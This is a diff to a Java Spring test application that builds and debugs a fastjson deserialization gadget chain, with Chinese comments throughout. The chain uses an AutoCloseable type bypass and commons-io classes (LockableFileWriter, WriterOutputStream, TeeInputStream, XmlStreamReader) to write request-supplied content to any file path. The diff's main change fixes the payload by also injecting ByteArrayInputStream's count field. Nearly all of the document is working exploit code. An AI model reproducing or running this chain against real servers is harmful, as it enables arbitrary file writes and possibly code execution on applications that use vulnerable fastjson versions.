@@ -64,12 +64,13 @@ public class App {
             r.put("ok", true);
         } catch (Exception e) {
             log.error("[RAW-ERR] {}:{}", e.getClass().getName(), e.getMessage());
+            StringWriter sw = new StringWriter(); e.printStackTrace(new PrintWriter(sw));
+            log.error("[RAW-STACK] {}", sw);
             r.put("ok", false); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
         }
         return r;
     }
 
-    /** 纯 Java 链（已确认可用）*/
     @PostMapping("/diag/chain")
     public Map<String, Object> diagChain(@RequestBody Map<String, String> body) {
         Map<String, Object> r = new LinkedHashMap<>();
@@ -93,51 +94,92 @@ public class App {
     }
 
     /**
-     * step=D  反射检查 fastjson 注入 TeeInputStream 后 input/branch 字段值
-     *         若两者非 null，手动 read() 驱动数据流
-     * step=E  fastjson 创建 lfw+wos，然后 Java 代码直接向 wos 写数据，验证 wos 是否真的写文件
-     * step=F  fastjson 创建 lfw+wos+bais，Java 代码手动 TeeInputStream(bais,wos) 并读完，验证链路正确性
+     * step=G  注入 buf + count，验证 ByteArrayInputStream 可正常读取
+     * step=H  完整链 + buf+count 注入，验证文件写入
      */
     @PostMapping("/diag/step")
     public Map<String, Object> diagStep(@RequestBody Map<String, String> body) {
-        String step = body.getOrDefault("step", "D");
+        String step = body.getOrDefault("step", "G");
         String file = body.getOrDefault("file", "/tmp/step_" + step);
         String content = body.getOrDefault("content", "STEP-" + step + "-OK\n");
         Map<String, Object> r = new LinkedHashMap<>();
 
         byte[] contentBytes = content.getBytes(StandardCharsets.ISO_8859_1);
-        byte[] paddedBytes = new byte[Math.max(contentBytes.length, 8193)];
-        System.arraycopy(contentBytes, 0, paddedBytes, 0, contentBytes.length);
-        for (int i = contentBytes.length; i < paddedBytes.length; i++) paddedBytes[i] = (byte) ' ';
-        String b64Content = Base64.getEncoder().encodeToString(paddedBytes);
+        // 使用实际内容长度，不填充，count = contentBytes.length
+        String b64Content = Base64.getEncoder().encodeToString(contentBytes);
+        int byteLen = contentBytes.length;
         String escapedFile = file.replace("\\", "\\\\").replace("\"", "\\\"");
-
-        // 公共 JSON 片段
-        String lfwJson = "\"lfw\":{\"@type\":\"java.lang.AutoCloseable\","
-                + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
-                + "\"file\":\"" + escapedFile + "\","
-                + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false}";
-        String wosJson = "\"wos\":{\"@type\":\"java.lang.AutoCloseable\","
-                + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
-                + "\"writer\":{\"$ref\":\"$.lfw\"},"
-                + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true}";
-        String baisJson = "\"bais\":{\"@type\":\"java.lang.AutoCloseable\","
-                + "\"@type\":\"java.io.ByteArrayInputStream\","
-                + "\"buf\":\"" + b64Content + "\"}";
-        String teeJson = "\"tee\":{\"@type\":\"java.lang.AutoCloseable\","
-                + "\"@type\":\"org.apache.commons.io.input.TeeInputStream\","
-                + "\"input\":{\"$ref\":\"$.bais\"},"
-                + "\"branch\":{\"$ref\":\"$.wos\"},"
-                + "\"closeBranch\":true}";
 
         try {
             switch (step) {
 
-                case "D": {
-                    // 创建完整链，然后用反射检查 TeeInputStream 字段
+                case "G": {
+                    // 关键修复：同时注入 buf 和 count
+                    // ByteArrayInputStream.read() 判断 pos < count，count=0 则立即返回 -1
+                    // fastjson 反射只注入 buf，count 保持 0
+                    // 解决方案：在 JSON 中额外注入 count 字段
+                    String json = "{\"@type\":\"java.lang.AutoCloseable\","
+                            + "\"@type\":\"java.io.ByteArrayInputStream\","
+                            + "\"buf\":\"" + b64Content + "\","
+                            + "\"count\":" + byteLen + "}";
+
+                    log.info("[STEP-G] json={}", json);
+                    Object result = JSONObject.parseObject(json);
+                    log.info("[STEP-G] parseObject OK, type={}", result == null ? "null" : result.getClass().getName());
+
+                    if (result instanceof ByteArrayInputStream) {
+                        ByteArrayInputStream bais = (ByteArrayInputStream) result;
+                        // 反射检查 count
+                        Field countField = ByteArrayInputStream.class.getDeclaredField("count");
+                        countField.setAccessible(true);
+                        int countVal = (int) countField.get(bais);
+                        Field posField = ByteArrayInputStream.class.getDeclaredField("pos");
+                        posField.setAccessible(true);
+                        int posVal = (int) posField.get(bais);
+                        log.info("[STEP-G] bais.count={} bais.pos={}", countVal, posVal);
+                        r.put("count", countVal);
+                        r.put("pos", posVal);
+
+                        // 尝试读取
+                        byte[] buf = new byte[1024];
+                        int n = bais.read(buf);
+                        log.info("[STEP-G] read {} bytes: {}", n, n > 0 ? new String(buf, 0, Math.min(n, 20)) : "(none)");
+                        r.put("readBytes", n);
+                        r.put("readPreview", n > 0 ? new String(buf, 0, Math.min(n, 20)) : "(none)");
+                    } else {
+                        log.info("[STEP-G] result is not ByteArrayInputStream but {}", result == null ? "null" : result.getClass());
+                        r.put("resultType", result == null ? "null" : result.getClass().getSimpleName());
+                    }
+                    r.put("ok", true);
+                    break;
+                }
+
+                case "H": {
+                    // 完整链，buf + count 同时注入
                     String json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
-                            + lfwJson + "," + wosJson + "," + baisJson + "," + teeJson
-                            + ",\"xml\":{\"@type\":\"java.lang.AutoCloseable\","
+                            // LockableFileWriter
+                            + "\"lfw\":{\"@type\":\"java.lang.AutoCloseable\","
+                            + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
+                            + "\"file\":\"" + escapedFile + "\","
+                            + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
+                            // WriterOutputStream → lfw
+                            + "\"wos\":{\"@type\":\"java.lang.AutoCloseable\","
+                            + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
+                            + "\"writer\":{\"$ref\":\"$.lfw\"},"
+                            + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true},"
+                            // ByteArrayInputStream，buf + count 同时注入
+                            + "\"bais\":{\"@type\":\"java.lang.AutoCloseable\","
+                            + "\"@type\":\"java.io.ByteArrayInputStream\","
+                            + "\"buf\":\"" + b64Content + "\","
+                            + "\"count\":" + byteLen + "},"
+                            // TeeInputStream：bais → wos
+                            + "\"tee\":{\"@type\":\"java.lang.AutoCloseable\","
+                            + "\"@type\":\"org.apache.commons.io.input.TeeInputStream\","
+                            + "\"input\":{\"$ref\":\"$.bais\"},"
+                            + "\"branch\":{\"$ref\":\"$.wos\"},"
+                            + "\"closeBranch\":true},"
+                            // XmlStreamReader：构造时读 tee，驱动数据流
+                            + "\"xml\":{\"@type\":\"java.lang.AutoCloseable\","
                             + "\"@type\":\"org.apache.commons.io.input.XmlStreamReader\","
                             + "\"is\":{\"$ref\":\"$.tee\"},"
                             + "\"httpContentType\":\"text/xml\","
@@ -145,111 +187,12 @@ public class App {
                             + "\"defaultEncoding\":\"iso-8859-1\"}"
                             + "}";
 
-                    log.info("[STEP-D] parsing...");
+                    log.info("[STEP-H] json len={}", json.length());
                     JSONObject result = JSONObject.parseObject(json);
-                    log.info("[STEP-D] parseObject OK");
-
-                    // 反射检查 TeeInputStream
-                    Object teeObj = result.get("tee");
-                    log.info("[STEP-D] tee type={}", teeObj == null ? "null" : teeObj.getClass().getName());
-
-                    if (teeObj instanceof TeeInputStream) {
-                        TeeInputStream ti = (TeeInputStream) teeObj;
-
-                        // FilterInputStream.in (protected) = TeeInputStream 内部 input 流
-                        Field inField = FilterInputStream.class.getDeclaredField("in");
-                        inField.setAccessible(true);
-                        Object inVal = inField.get(ti);
-                        log.info("[STEP-D] FilterInputStream.in = {}", inVal == null ? "NULL" : inVal.getClass().getName());
-
-                        // TeeInputStream.branch (private)
-                        Field branchField = TeeInputStream.class.getDeclaredField("branch");
-                        branchField.setAccessible(true);
-                        Object branchVal = branchField.get(ti);
-                        log.info("[STEP-D] TeeInputStream.branch = {}", branchVal == null ? "NULL" : branchVal.getClass().getName());
-
-                        r.put("teeIn", inVal == null ? "NULL" : inVal.getClass().getSimpleName());
-                        r.put("teeBranch", branchVal == null ? "NULL" : branchVal.getClass().getSimpleName());
-
-                        if (inVal != null && branchVal != null) {
-                            log.info("[STEP-D] Both fields set! Manually reading to drive data flow...");
-                            byte[] buf = new byte[4096];
-                            int total = 0, n;
-                            while ((n = ti.read(buf)) != -1) total += n;
-                            ti.close();
-                            log.info("[STEP-D] Read {} bytes total", total);
-                        } else {
-                            log.info("[STEP-D] TeeInputStream fields NOT injected properly!");
-                        }
-                    }
+                    log.info("[STEP-H] parseObject OK, keys={}", result == null ? "null" : result.keySet());
 
                     File f = new File(file);
-                    log.info("[STEP-D] file exists={} size={}", f.exists(), f.exists() ? f.length() : -1);
-                    r.put("fileExists", f.exists());
-                    r.put("fileSize", f.exists() ? f.length() : -1);
-                    r.put("ok", true);
-                    break;
-                }
-
-                case "E": {
-                    // fastjson 创建 lfw+wos，然后 Java 直接向 wos 写数据
-                    String json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\"," + lfwJson + "," + wosJson + "}";
-                    JSONObject result = JSONObject.parseObject(json);
-                    log.info("[STEP-E] parseObject OK, keys={}", result.keySet());
-
-                    Object wosObj = result.get("wos");
-                    log.info("[STEP-E] wos type={}", wosObj == null ? "null" : wosObj.getClass().getName());
-
-                    if (wosObj instanceof WriterOutputStream) {
-                        WriterOutputStream wos = (WriterOutputStream) wosObj;
-                        byte[] testBytes = content.getBytes(StandardCharsets.ISO_8859_1);
-                        wos.write(testBytes);
-                        wos.flush();
-                        wos.close();
-                        log.info("[STEP-E] Wrote {} bytes to WOS", testBytes.length);
-                    } else {
-                        log.info("[STEP-E] wos is NOT WriterOutputStream, type={}",
-                                wosObj == null ? "null" : wosObj.getClass().getName());
-                    }
-
-                    File f = new File(file);
-                    log.info("[STEP-E] file exists={} size={}", f.exists(), f.exists() ? f.length() : -1);
-                    r.put("fileExists", f.exists());
-                    r.put("fileSize", f.exists() ? f.length() : -1);
-                    r.put("wosType", wosObj == null ? "null" : wosObj.getClass().getSimpleName());
-                    r.put("ok", true);
-                    break;
-                }
-
-                case "F": {
-                    // fastjson 创建 lfw+wos+bais，Java 手动构建 TeeInputStream 并读完
-                    String json = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
-                            + lfwJson + "," + wosJson + "," + baisJson + "}";
-                    JSONObject result = JSONObject.parseObject(json);
-                    log.info("[STEP-F] parseObject OK, keys={}", result.keySet());
-
-                    Object wosObj = result.get("wos");
-                    Object baisObj = result.get("bais");
-
-                    log.info("[STEP-F] wos={}", wosObj == null ? "null" : wosObj.getClass().getName());
-                    log.info("[STEP-F] bais={}", baisObj == null ? "null" : baisObj.getClass().getName());
-
-                    if (wosObj instanceof WriterOutputStream && baisObj instanceof ByteArrayInputStream) {
-                        WriterOutputStream wos = (WriterOutputStream) wosObj;
-                        ByteArrayInputStream bais = (ByteArrayInputStream) baisObj;
-                        // 手动创建 TeeInputStream 并读完
-                        TeeInputStream tee = new TeeInputStream(bais, wos, true);
-                        byte[] buf = new byte[4096];
-                        int total = 0, n;
-                        while ((n = tee.read(buf)) != -1) total += n;
-                        tee.close();
-                        log.info("[STEP-F] Manually read {} bytes through TeeInputStream", total);
-                    } else {
-                        log.info("[STEP-F] Type mismatch or null - cannot proceed");
-                    }
-
-                    File f = new File(file);
-                    log.info("[STEP-F] file exists={} size={}", f.exists(), f.exists() ? f.length() : -1);
+                    log.info("[STEP-H] file exists={} size={}", f.exists(), f.exists() ? f.length() : -1);
                     r.put("fileExists", f.exists());
                     r.put("fileSize", f.exists() ? f.length() : -1);
                     r.put("ok", true);
@@ -257,7 +200,7 @@ public class App {
                 }
 
                 default:
-                    r.put("ok", false); r.put("msg", "step must be D/E/F"); return r;
+                    r.put("ok", false); r.put("msg", "step must be G or H"); return r;
             }
 
         } catch (Exception e) {
